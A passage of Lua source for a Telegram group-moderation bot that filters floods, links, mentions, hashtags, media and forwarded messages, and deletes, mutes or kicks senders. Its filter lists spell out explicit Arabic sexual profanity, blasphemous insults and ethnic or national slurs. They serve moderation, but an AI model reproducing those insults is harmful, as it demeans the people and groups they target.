database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_," 𖥔 تم حفظ الرابط بنجاح")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if VENOM_Msg and not Special(msg) then  
local VENOM_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if VENOM_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖥔 ["..VENOM_Msg.."] \n")
else
send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 ["..VENOM_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Special(msg) and msg.content_.ID ~= "MessageChatAddMembers" and database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(database:get(bot_id..'floodc:「'..msg.sender_user_id_..'」:'..msg.chat_id_) or 0)
if post_count > tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
database:setex(bot_id..'floodc:「'..msg.sender_user_id_..'」:'..msg.chat_id_, tonumber(database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = database:hget(bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن", "خالی بند","عزیزم خوبی","سلامت باشی","میخوام","سلام","خوببی","ميدم","کی اومدی","خوابیدین"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Engilsh'..msg.chat_id_) and not Special(msg) then 
list = {'a','u','y','l','t','b','A','Q','U','J','K','L','B','D','L','V','Z','k','n','c','r','q','o','z','I','j','m','M','w','d','h','e'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fshar'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","االمنيوك","كسمككك","الشرموطه","ابن العرث","ابن الحيضانه","زبك","خول","زبي","قاحب"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Fars'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","ابن العرص","منايك","متناك","احا","ابن المتناكه","زبك","عرص","زبي","خول","لبوه","لباوي","ابن اللبوه","منيوك","كسمكك","متناكه","احو","احي","يا عرص","يا خول","قحبه","القحبه","شراميط","العلق","العلوق","العلقه","كسمك","يا ابن الخول","المتناك","شرموط","شرموطه","ابن الشرموطه","ابن الخول","االمنيوك","كسمككك","الشرموطه","ابن العرث","ابن الحيضانه","زبك","خول","زبي","قاحب"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"ڄ","گ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن","اصل","پ","پی","لطفا","سکوت","نیومدم","گم","كس","كحبه","تبادل","جهات","سني","شيعي","ياسعودي","ياعراكي","كسمك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"ربج","خرب دينك","خرب دينج","عير بربك","جهات","كس ربك","رب الكواد","كسم ربك","خرب دينك","خرب دينج","عير بربك","سكسي","كس ربك","خرب الله","صوج الله","خرب محمد","الله الكواد","صوج الله","كسخت الله","ربك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"زيج","عفطه","نيجه","مصه","لحسه","العبي","ابن التنيج","ارد اتنايج","خره بالعراق","انعل رب العراق","كسربك","كسج","كسي","تنيج","69","عير","كيري","مبعوص","كسختك","بعبصتكم","موشريفه","ابن","صرم","اختك","خالتك","امك","رب الكواد","xnxx","كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
if text and database:get(bot_id..'lock:Azag'..msg.chat_id_) and not Special(msg) then 
list = {"يا عبد","يا سعودي","يا عراقي","يا عراكي","يا سوري","يا فلسطيني","يا اردني","يا مصري","يا خليجي","يا محتل","يا مشرد","يا فقير","يبن فقيره","يا مهان","يا ابيض","يا نظيف","يعبد","يسعودي","يعراقي","يعاركي","يمصري","يردني","يمشرد","يفقير","يفلسطيني","يابيض","يا هطف","يبن هبله","يحمار","ياهبل","يخليجي"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id..'lock:text'..msg.chat_id_) and not Special(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
database:incr(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Special(msg) then   
if database:get(bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
chat_kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Special(msg) then 
if database:get(bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
chat_kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if database:get(bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Special(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Special(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Special(msg) then    
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Special(msg) then    
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Special(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Special(msg) then
if database:get(bot_id.."lock:Link"..msg.chat_id_) == "del" and not Special(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Special(msg) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Special(msg) then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Special(msg) then     
if database:get(bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Special(msg) then     
if database:get(bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Special(msg) then     
if database:get(bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then     
if database:get(bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Special(msg) then     
if database:get(bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVoice' and not Special(msg) then     
if database:get(bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Special(msg) then     
if database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Special(msg) then     
if database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."lock:inline"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:inline"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then     
if database:get(bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Special(msg) then     
if database:get(bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then      
if database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Special(msg) then
if database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
chat_kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
